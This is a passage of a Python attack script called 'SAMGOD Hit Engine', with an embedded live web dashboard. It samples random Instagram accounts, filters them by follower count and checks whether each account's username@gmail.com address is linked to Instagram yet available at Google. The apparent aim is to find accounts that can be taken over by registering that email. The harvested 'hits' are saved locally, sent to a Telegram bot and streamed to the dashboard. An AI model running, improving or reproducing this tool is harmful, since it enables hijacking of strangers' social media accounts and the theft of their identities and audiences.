  transform:translateZ(60px) rotateX(0) rotateY(0) scale(1.03);
  box-shadow:
    0 30px 90px rgba(0,0,0,.7),
    0 0 50px rgba(255,200,58,.35),
    inset 0 1px 0 rgba(255,255,255,.2);
  animation-play-state:paused;
}
.card .glow{
  position:absolute;inset:-2px;border-radius:24px;
  background:conic-gradient(from 0deg,transparent,var(--gold),transparent 30%,transparent 60%,var(--cyan),transparent);
  opacity:0;filter:blur(12px);z-index:-1;
  transition:opacity .3s;
  animation:spin 4s linear infinite;
}
.card:hover .glow{opacity:.55}
@keyframes spin{to{transform:rotate(360deg)}}

.card-label{
  font-size:11px;letter-spacing:.35em;color:#8b93a8;
  text-transform:uppercase;margin-bottom:10px;
  transform:translateZ(15px);
}
.card-value{
  font-size:44px;font-weight:900;letter-spacing:-.02em;
  background:linear-gradient(135deg,#fff,var(--gold));
  -webkit-background-clip:text;background-clip:text;color:transparent;
  transform:translateZ(25px);
  font-variant-numeric:tabular-nums;
}
.card[data-key="hits"] .card-value{background:linear-gradient(135deg,#fff,var(--cyan));-webkit-background-clip:text;background-clip:text}
.card[data-key="bad"]  .card-value{background:linear-gradient(135deg,#fff,var(--red));-webkit-background-clip:text;background-clip:text}
.card[data-key="up"]   .card-value{background:linear-gradient(135deg,#fff,var(--purple));-webkit-background-clip:text;background-clip:text}

/* ── feed ──────────────────────────────────────────────── */
.feed-head{
  display:flex;align-items:center;gap:14px;
  margin-bottom:22px;padding-left:4px;
  transform-style:preserve-3d;
}
.feed-head h2{
  font-size:15px;letter-spacing:.4em;color:var(--gold);
  text-transform:uppercase;font-weight:700;
  text-shadow:0 0 20px rgba(255,200,58,.5);
}
.feed-head .bar{flex:1;height:1px;background:linear-gradient(90deg,rgba(255,200,58,.5),transparent)}
.feed-list{display:flex;flex-direction:column;gap:16px;transform-style:preserve-3d}
.hit{
  position:relative;
  padding:20px 24px;border-radius:18px;
  background:linear-gradient(140deg,rgba(255,200,58,.08),rgba(0,229,255,.04));
  border:1px solid rgba(255,200,58,.25);
  backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
  transform-style:preserve-3d;
  box-shadow:0 15px 40px rgba(0,0,0,.4),inset 0 1px 0 rgba(255,255,255,.08);
  animation:hitIn .7s cubic-bezier(.2,.9,.3,1.2) both;
}
@keyframes hitIn{
  from{opacity:0;transform:translateX(60px) rotateY(-22deg) translateZ(-40px)}
  to{opacity:1;transform:translateX(0) rotateY(0) translateZ(0)}
}
.hit::before{
  content:'';position:absolute;left:0;top:14px;bottom:14px;width:3px;border-radius:3px;
  background:linear-gradient(180deg,var(--gold),var(--pink));
  box-shadow:0 0 18px var(--gold);
}
.hit-row{
  display:flex;flex-wrap:wrap;gap:6px 20px;align-items:baseline;
  font-size:13px;color:#c4cbe0;
}
.hit-row b{color:#fff;letter-spacing:.02em}
.hit-title{
  display:flex;align-items:center;gap:10px;
  font-size:15px;font-weight:800;color:#fff;margin-bottom:10px;
}
.hit-title .bolt{color:var(--gold);filter:drop-shadow(0 0 8px var(--gold))}
.hit-email{color:var(--cyan);font-weight:600}
.hit a{color:var(--pink);text-decoration:none;font-weight:600;border-bottom:1px dashed rgba(255,46,154,.5)}
.hit a:hover{color:#fff;text-shadow:0 0 12px var(--pink)}
.empty{
  text-align:center;padding:60px 20px;color:#565d75;
  border:1px dashed rgba(255,255,255,.08);border-radius:18px;
  font-size:14px;letter-spacing:.2em;
}
</style>
</head>
<body>

<div class="blob blob-1"></div>
<div class="blob blob-2"></div>
<div class="blob blob-3"></div>
<div class="grid-floor"></div>

<div class="stage">
  <header class="hero">
    <h1 class="title">⬢ SAMGOD ⬢</h1>
    <p class="sub">Hit Engine · 3D Live Dashboard</p>
    <div class="pill"><span class="dot"></span> ENGINE RUNNING</div>
  </header>

  <section class="stats">
    <div class="card" data-key="hits"><div class="glow"></div>
      <div class="card-label">Total Hits</div>
      <div class="card-value" id="v-hits">0</div>
    </div>
    <div class="card" data-key="good"><div class="glow"></div>
      <div class="card-label">Good Emails</div>
      <div class="card-value" id="v-good">0</div>
    </div>
    <div class="card" data-key="bad"><div class="glow"></div>
      <div class="card-label">Bad Emails</div>
      <div class="card-value" id="v-bad">0</div>
    </div>
    <div class="card" data-key="up"><div class="glow"></div>
      <div class="card-label">Uptime</div>
      <div class="card-value" id="v-up">00:00:00</div>
    </div>
  </section>

  <section class="feed">
    <div class="feed-head">
      <h2>◈ Live Feed</h2>
      <div class="bar"></div>
    </div>
    <div class="feed-list" id="feed-list">
      <div class="empty" id="empty">⌁ Waiting for first hit ⌁</div>
    </div>
  </section>
</div>

<script>
// ── mouse parallax ────────────────────────────────────
const root = document.documentElement;
let tx = 0, ty = 0, cx = 0, cy = 0;
document.addEventListener('mousemove', e => {
  tx = (e.clientX / innerWidth  - .5) * 10;
  ty = (e.clientY / innerHeight - .5) * -10;
});
(function loop(){
  cx += (tx - cx) * .08;
  cy += (ty - cy) * .08;
  root.style.setProperty('--mx', cx.toFixed(2) + 'deg');
  root.style.setProperty('--my', cy.toFixed(2) + 'deg');
  requestAnimationFrame(loop);
})();

// ── helpers ───────────────────────────────────────────
const $ = id => document.getElementById(id);
const fmtUp = s => {
  const h = String(Math.floor(s/3600)).padStart(2,'0');
  const m = String(Math.floor((s%3600)/60)).padStart(2,'0');
  const x = String(s%60).padStart(2,'0');
  return `${h}:${m}:${x}`;
};
const num = n => n.toLocaleString('en-US');

// ── stat animation ────────────────────────────────────
const shown = {hits:0, good:0, bad:0};
function setStat(k, target){
  const el = $('v-'+k);
  const start = shown[k], diff = target - start;
  if (diff === 0) return;
  const t0 = performance.now(), dur = 600;
  function step(t){
    const p = Math.min((t-t0)/dur, 1);
    const eased = 1 - Math.pow(1-p, 3);
    shown[k] = Math.round(start + diff*eased);
    el.textContent = k === 'up' ? fmtUp(shown[k]) : num(shown[k]);
    if (p < 1) requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
}

// ── hit renderer ──────────────────────────────────────
function esc(s){return String(s||'').replace(/[&<>"]/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]))}
function renderHit(h){
  const empty = $('empty');
  if (empty) empty.remove();

  const d = document.createElement('div');
  d.className = 'hit';
  d.innerHTML = `
    <div class="hit-title"><span class="bolt">⚡</span> HIT CAPTURED · @${esc(h.username)}</div>
    <div class="hit-row">
      <span><b>Email:</b> <span class="hit-email">${esc(h.email)}</span></span>
      <span><b>Name:</b> ${esc(h.full_name)}</span>
      <span><b>Followers:</b> ${num(h.followers||0)}</span>
      <span><b>Posts:</b> ${h.posts||0}</span>
      <span><b>Age:</b> ${esc(h.year)}</span>
      <span><b>Reset:</b> ${esc(h.reset)}</span>
      <span><b>Monetize:</b> ${esc(h.monetize)}</span>
    </div>
    <div class="hit-row" style="margin-top:8px">
      <a href="https://instagram.com/${esc(h.username)}" target="_blank">⬡ @${esc(h.username)}</a>
    </div>
  `;
  const list = $('feed-list');
  list.insertBefore(d, list.firstChild);
  // keep max 30
  while (list.children.length > 30) list.removeChild(list.lastChild);
}

// ── initial stats fetch ───────────────────────────────
async function pull(){
  try{
    const r = await fetch('/api/stats');
    const j = await r.json();
    setStat('hits', j.hits);
    setStat('good', j.good);
    setStat('bad',  j.bad);
    setStat('up',   j.uptime);
    if (j.recent && j.recent.length){
      const list = $('feed-list');
      if ($('empty')) $('empty').remove();
      // render oldest first so newest is at top
      for (const h of [...j.recent].reverse()) renderHit(h);
    }
  }catch(e){}
}
pull();
setInterval(pull, 2500);

// ── SSE for live hits ─────────────────────────────────
function connect(){
  const es = new EventSource('/api/stream');
  es.onmessage = ev => {
    try{
      const h = JSON.parse(ev.data);
      renderHit(h);
      setStat('hits', (shown.hits||0) + 1);
    }catch(e){}
  };
  es.onerror = () => { es.close(); setTimeout(connect, 3000); };
}
connect();
</script>
</body>
</html>
"""


def start_dashboard():
    if not FLASK_OK:
        print(f"{ORANGE}⚠  Flask not installed — web dashboard disabled.")
        print(f"{DIM}   pip install flask{RESET}\n")
        return

    app = Flask(__name__)
    app.logger.setLevel('ERROR')

    @app.route('/')
    def _index():
        return render_template_string(DASHBOARD_HTML)

    @app.route('/api/stats')
    def _stats():
        with _display_lock:
            payload = {
                'hits': hits,
                'good': good,
                'bad': bad,
                'uptime': int(time.time() - start_time),
                'recent': list(recent_hits),
            }
        return jsonify(payload)

    @app.route('/api/stream')
    def _stream():
        def gen():
            # initial hello so browser marks connection open
            yield "retry: 3000\n\n"
            while True:
                try:
                    hit = hit_queue.get(timeout=15)
                    yield f"data: {json.dumps(hit)}\n\n"
                except queue.Empty:
                    yield ": ping\n\n"
        return Response(gen(), mimetype='text/event-stream',
                        headers={'Cache-Control': 'no-cache',
                                 'X-Accel-Buffering': 'no'})

    def _run():
        try:
            app.run(host='0.0.0.0', port=WEB_PORT,
                    debug=False, threaded=True, use_reloader=False)
        except Exception as e:
            print(f"{RED}⟡ Dashboard failed: {e}{RESET}")

    threading.Thread(target=_run, daemon=True).start()
    time.sleep(1)
    print(f"{NEON}⟡ ────────────────────────────────────────── ⟡{RESET}")
    print(f"{GOLD}⬢  3D DASHBOARD ONLINE{RESET}")
    print(f"{BLUE}⌁  {WHITE}http://127.0.0.1:{WEB_PORT}{RESET}")
    print(f"{NEON}⟡ ────────────────────────────────────────── ⟡{RESET}\n")


# ══════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════
print_banner()

chat_id = input(f"{BLUE}⬢{RESET} {WHITE}Enter Telegram Chat ID{RESET} {DIM}▸{RESET} ").strip()
print("")

if not check_telegram_access(chat_id):
    print(f"{RED}◈ Access Denied. Exiting...{RESET}")
    sys.exit()

bot_token = input(f"{BLUE}⬢{RESET} {WHITE}Enter Telegram Bot Token{RESET} {DIM}▸{RESET} ").strip()
print("")
os.system('cls' if os.name == 'nt' else 'clear')

print_banner()
print(f"{NEON}     ⟡ ────────────────────────────────────────── ⟡{RESET}")
print(f"{PURPLE}              ⌁   SAMGOD ENGINE — ACTIVE   ⌁{RESET}")
print(f"{DIM}          auto-stop : {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}{RESET}")
print(f"{NEON}     ⟡ ────────────────────────────────────────── ⟡{RESET}\n")

time_until_expiry = (expiry_date - current_date).total_seconds()
if time_until_expiry <= 0:
    print("\n⟡ Expiry date has already passed.")
    sys.exit()
expire_time = start_time + time_until_expiry

reporter = ReportManager(bot_token, chat_id)
google = GoogleChecker()
insta = InstagramChecker()

# start the 3D web dashboard
start_dashboard()


def process_user():
    global hits, good, bad
    while True:
        if time.time() > expire_time:
            print(f"\n{WHITE}⌁ Time expired. Stopping workers.{RESET}")
            sys.exit(0)
        try:
            user_id = random.randint(2500000000, 21254029834)
            user_data = insta.get_user_data(user_id)
            if not user_data:
                time.sleep(random.uniform(0.05, 0.15))
                continue

            username = user_data.get('username')
            if not username:
                continue

            followers = user_data.get('follower_count', 0)
            if followers < MIN_FOLLOWERS:
                time.sleep(random.uniform(0.02, 0.08))
                continue

            email = f"{username}@gmail.com"
            if insta.check_email(email):
                good += 1
                display()
                if google.check_availability(email) == 'good':
                    hits += 1
                    display()
                    profile = {
                        'username': username,
                        'email': email,
                        'full_name': user_data.get('full_name', ''),
                        'follower_count': followers,
                        'following_count': user_data.get('following_count') or 0,
                        'media_count': user_data.get('media_count') or 0,
                        'is_private': user_data.get('is_private', False),
                        'biography': user_data.get('biography', ''),
                        'pk': user_data.get('pk', ''),
                    }
                    console_msg, telegram_msg = reporter.format_result(profile)
                    sys.stdout.write('\r' + ' ' * 80 + '\r')
                    print(console_msg)
                    plain_msg = re.sub(r'<[^>]+>', '', telegram_msg)
                    reporter.save_to_file(plain_msg)
                    reporter.send_telegram(telegram_msg)

                    # ── push to 3D dashboard ────────────────────────────
                    def _yr(pk):
                        try:
                            pk = int(pk)
                            ranges = [
                                (1, 5000000, 2010), (5000001, 17750000, 2011), (17750001, 279760000, 2012),
                                (279760001, 900990000, 2013), (900990001, 1629010000, 2014),
                                (1629010001, 2369359761, 2015), (2369359762, 4239516754, 2016),
                                (4239516755, 6345108209, 2017), (6345108210, 10016232395, 2018),
                                (10016232396, 27238602159, 2019), (27238602160, 43464475395, 2020),
                                (43464475395, 50289297647, 2021), (50289297647, 57464707082, 2022),
                                (57464707082, 63313426938, 2023), (63313426938, 70134323896, 2024),
                            ]
                            for lo, hi, y in ranges:
                                if lo <= pk <= hi:
                                    return str(y)
                        except Exception:
                            pass
                        return "2023+"

                    monetize = "✅ Eligible" if (
                        profile['follower_count'] >= 50
                        and not profile['is_private']
                    ) else "❌ Not Eligible"

                    hit_payload = {
                        'username': username,
                        'email': email,
                        'full_name': profile['full_name'] or '-',
                        'followers': profile['follower_count'],
                        'posts': profile['media_count'],
                        'year': _yr(profile['pk']),
                        'reset': '—',
                        'monetize': monetize,
                    }
                    with _display_lock:
                        recent_hits.append(hit_payload)
                    try:
                        hit_queue.put(hit_payload)
                    except Exception:
                        pass
            else:
                bad += 1
                display()
            time.sleep(random.uniform(0.05, 0.15))
        except Exception:
            time.sleep(random.uniform(0.1, 0.2))
            continue


if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for _ in range(THREADS):
            executor.submit(process_user)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print('\n' + NEON + '⟡  SAMGOD HIT ENGINE  —  SESSION ENDED  ⟡' + RESET)
